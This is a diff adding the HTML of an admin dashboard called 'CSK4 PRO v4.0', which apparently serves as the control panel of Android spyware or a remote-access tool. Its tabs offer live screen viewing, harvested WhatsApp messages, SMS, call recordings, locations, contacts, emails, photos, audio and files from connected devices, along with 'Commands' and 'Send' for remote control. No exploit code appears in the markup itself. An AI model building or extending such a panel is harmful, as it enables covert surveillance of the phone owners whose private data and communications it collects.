@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CSK4 PRO v4.0 - Admin Panel</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- ============ LOGIN SCREEN ============ -->
+<div id="loginScreen" class="login-screen">
+  <div class="login-box">
+    <h1>CSK4 PRO</h1>
+    <p class="subtitle">v4.0 - MongoDB + Telegram</p>
+    <input type="text" id="username" value="admin" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">🔐 LOGIN</button>
+    <p id="loginError" class="error"></p>
+    <div class="login-info">
+      <p>🟢 Server: Live</p>
+      <p>💾 MongoDB: Connected</p>
+      <p>📱 Telegram: Active</p>
+    </div>
+  </div>
+</div>
+
+<!-- ============ DASHBOARD ============ -->
+<div id="dashboard" class="dashboard hidden">
+  
+  <!-- HEADER -->
+  <header>
+    <h1>🛡️ CSK4 PRO v4.0</h1>
+    <div class="header-right">
+      <span class="server-status">🟢 MongoDB + Telegram</span>
+      <button onclick="loadData()" class="btn-refresh">🔄 Refresh</button>
+      <button onclick="logout()" class="btn-logout">Logout</button>
+    </div>
+  </header>
+
+  <!-- STATS GRID -->
+  <div class="stats-grid" id="statsGrid"></div>
+
+  <!-- MAIN TABS -->
+  <div class="tabs">
+    <button class="tab active" data-tab="devices" onclick="showTab('devices', event)">📱 Devices</button>
+    <button class="tab" data-tab="live" onclick="showTab('live', event)">🔴 LIVE</button>
+    <button class="tab" data-tab="screen" onclick="showTab('screen', event)">🖥️ Screen</button>
+    <button class="tab" data-tab="notifications" onclick="showTab('notifications', event)">🔔 Notifications</button>
+    <button class="tab" data-tab="whatsapp" onclick="showTab('whatsapp', event)">💬 WhatsApp</button>
+    <button class="tab" data-tab="messages" onclick="showTab('messages', event)">📩 SMS</button>
+    <button class="tab" data-tab="calllogs" onclick="showTab('calllogs', event)">📞 Calls</button>
+    <button class="tab" data-tab="callrec" onclick="showTab('callrec', event)">🎙️ Call Rec</button>
+    <button class="tab" data-tab="locations" onclick="showTab('locations', event)">📍 Locations</button>
+    <button class="tab" data-tab="contacts" onclick="showTab('contacts', event)">👥 Contacts</button>
+    <button class="tab" data-tab="siminfo" onclick="showTab('siminfo', event)">📱 SIM Info</button>
+    <button class="tab" data-tab="accounts" onclick="showTab('accounts', event)">👤 Accounts</button>
+    <button class="tab" data-tab="emails" onclick="showTab('emails', event)">📧 Emails</button>
+    <button class="tab" data-tab="photos" onclick="showTab('photos', event)">📷 Photos</button>
+    <button class="tab" data-tab="videos" onclick="showTab('videos', event)">🎥 Videos</button>
+    <button class="tab" data-tab="screenshots" onclick="showTab('screenshots', event)">📸 Screenshots</button>
+    <button class="tab" data-tab="audio" onclick="showTab('audio', event)">🎤 Audio</button>
+    <button class="tab" data-tab="files" onclick="showTab('files', event)">📁 Files</button>
+    <button class="tab" data-tab="apps" onclick="showTab('apps', event)">📲 Apps</button>
+    <button class="tab" data-tab="bluetooth" onclick="showTab('bluetooth', event)">📶 Bluetooth</button>
+    <button class="tab" data-tab="activities" onclick="showTab('activities', event)">📊 Activities</button>
+    <button class="tab" data-tab="send" onclick="showTab('send', event)">📤 Send</button>
+    <button class="tab" data-tab="info" onclick="showTab('info', event)">ℹ️ Info</button>
+    <button class="tab" data-tab="commands" onclick="showTab('commands', event)">🎮 Commands</button>
+  </div>
+
+  <!-- TAB CONTENT -->
+  <div id="tabContent" class="tab-content">
+    <div class="loading">Loading...</div>
+  </div>
+</div>
+
+<!-- ============ SCRIPTS ============ -->
+<script src="/socket.io/socket.io.js"></script>
+<script src="webrtc.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
